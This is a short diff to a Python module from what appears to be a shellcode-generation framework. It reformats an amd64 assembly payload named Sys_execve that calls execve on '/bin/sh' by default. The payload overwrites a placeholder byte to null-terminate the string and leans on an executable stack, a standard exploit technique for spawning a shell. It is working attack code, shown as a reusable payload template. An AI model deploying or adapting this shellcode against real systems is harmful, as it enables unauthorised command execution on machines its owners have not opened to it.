@@ -5,24 +5,24 @@ class Module(BaseModule):
     def __init__(self, target='/bin/sh'):
         params = {'exec_target': target}
 
-        data = '''
-        sh:
-            .ascii "{exec_target}"
-        eol:
-            .byte 0xff
-        '''
-        code = '''
-        exec:
-            xorl %eax, %eax
-            # stack is executable, i can do this
-            movb %al, eol(%rip)
-            leaq sh(%rip), %rdi
-            # sys_execve
-            movb $59, %al
-            xorl %edx, %edx
-            xorl %esi, %esi
-            syscall
-        '''
+        data = (
+            'sh:\n'
+            '    .ascii "{exec_target}"\n'
+            'eol:\n'
+            '    .byte 0xff\n'
+        )
+        code = (
+            'exec:\n'
+            '    xorl %eax, %eax\n'
+            '    movb %al, eol(%rip)\n'
+            '    leaq sh(%rip), %rdi\n'
+            '    # sys_execve\n'
+            '    movb $59, %al\n'
+            '    xorl %edx, %edx\n'
+            '    xorl %esi, %esi\n'
+            '    syscall\n'
+        )
+
         super().__init__(
             name='Sys_execve', arch='amd64',
             code=code, data=data, params=params
